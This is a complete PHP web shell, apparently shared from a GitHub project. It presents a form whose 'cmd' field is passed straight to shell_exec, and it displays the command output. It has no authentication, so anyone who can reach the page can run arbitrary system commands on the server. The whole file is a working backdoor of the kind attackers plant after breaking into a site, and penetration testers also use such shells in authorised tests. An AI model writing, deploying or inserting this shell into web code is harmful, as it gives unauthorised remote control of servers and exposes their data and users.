<!-- By justin-p (https://github.com/justin-p) based of https://github.com/artyuum/Simple-PHP-Web-Shell/ -->
<?php if (empty($_POST['cmd'])) {$cmd = "";} elseif (!empty($_POST['cmd'])) {$cmd = shell_exec($_POST['cmd']);} ?>
<form method="POST"><input type="text" style="width:100%;height:25px;" name="cmd" id="cmd" value="<?php if (!empty($_POST['cmd'])) {htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8');} ?>" required><button type="submit" class="btn btn-primary">Execute</button></form>
<?php if (!$cmd && $_SERVER['REQUEST_METHOD'] != 'POST'): ?><small>Enter command.</small> <?php elseif ($cmd): ?><pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre> <?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'): ?><small>No results.</small><?php endif; ?>
